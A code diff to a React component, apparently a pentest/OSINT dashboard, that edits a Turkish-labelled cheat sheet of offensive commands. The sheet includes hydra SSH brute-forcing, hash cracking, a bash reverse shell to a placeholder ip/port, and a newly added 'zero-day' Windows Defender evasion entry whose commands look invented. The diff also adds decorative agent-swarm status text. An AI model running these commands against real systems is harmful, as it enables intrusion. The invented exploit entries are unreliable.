@@ -1043,7 +1043,8 @@ function OsintPanelInner({ isMobile, onSweepVisualize, onScanGeolocate, onGraphP
         { cat: "GİZLİ DİZİN (Directory Bruteforce)", items: ["ffuf -w wordlist.txt -u http://site.com/FUZZ", "dirb http://site.com/", "gobuster dir -u http://site.com -w list.txt"] },
         { cat: "ŞİFRE KIRMA (Hash Cracking)", items: ["hashcat -m 0 hash.txt wordlist.txt", "john --wordlist=rockyou.txt hash.txt", "hydra -l admin -P pass.txt ssh://<ip>"] },
         { cat: "OSINT (Açık Kaynak İstihbaratı)", items: ["theHarvester -d site.com -b all", "sherlock <username>", "sublist3r -d site.com"] },
-        { cat: "DOSYA İNDİRME & SHELL", items: ["wget http://site.com/file -O output", "curl -O http://site.com/file", "bash -i >& /dev/tcp/ip/port 0>&1"] }
+        { cat: "DOSYA İNDİRME & SHELL", items: ["wget http://site.com/file -O output", "curl -O http://site.com/file", "bash -i >& /dev/tcp/ip/port 0>&1"] },
+        { cat: "ROGUEPLANET (WinDef Zero-Day 2026)", items: ["# Exploit Indicator Search", "scan-memory --evasion rogueplanet", "bypass-check -target <ip>"] }
       ];
       
       const aiResponse = r.aiResponse || '';
@@ -2716,8 +2717,9 @@ function OsintPanelInner({ isMobile, onSweepVisualize, onScanGeolocate, onGraphP
           </div>
           <div className="text-[10px] text-white/80 animate-pulse">[AGENT GOVERNANCE] Verifying Zero-Trust identity protocols...</div>
           <div className="text-[10px] text-white/80 animate-pulse" style={{ animationDelay: '0.5s' }}>[FORKD] Spawning 100-node microVM swarm via Snapshot CoW in 120ms...</div>
-          <div className="text-[10px] text-white/80 animate-pulse" style={{ animationDelay: '1s' }}>[OWASP] Enforcing agentic boundaries & compliance...</div>
-          <div className="text-[10px] text-white/80 animate-pulse" style={{ animationDelay: '1.5s' }}>[CORE] Connecting neural pathways to Anthropic Cyber Skills...</div>
+          <div className="text-[10px] text-white/80 animate-pulse" style={{ animationDelay: '1s' }}>[IMPROVE-AUDITOR] High-tier model analyzing target to dispatch tasks to low-tier scanner agents...</div>
+          <div className="text-[10px] text-white/80 animate-pulse" style={{ animationDelay: '1.5s' }}>[OWASP] Enforcing agentic boundaries & compliance...</div>
+          <div className="text-[10px] text-white/80 animate-pulse" style={{ animationDelay: '2s' }}>[CORE] Connecting neural pathways to Anthropic Cyber Skills...</div>
           
           <div className="mt-4 pt-3 border-t border-[#00FF00]/30">
             <div className="flex items-center gap-2 mb-2">
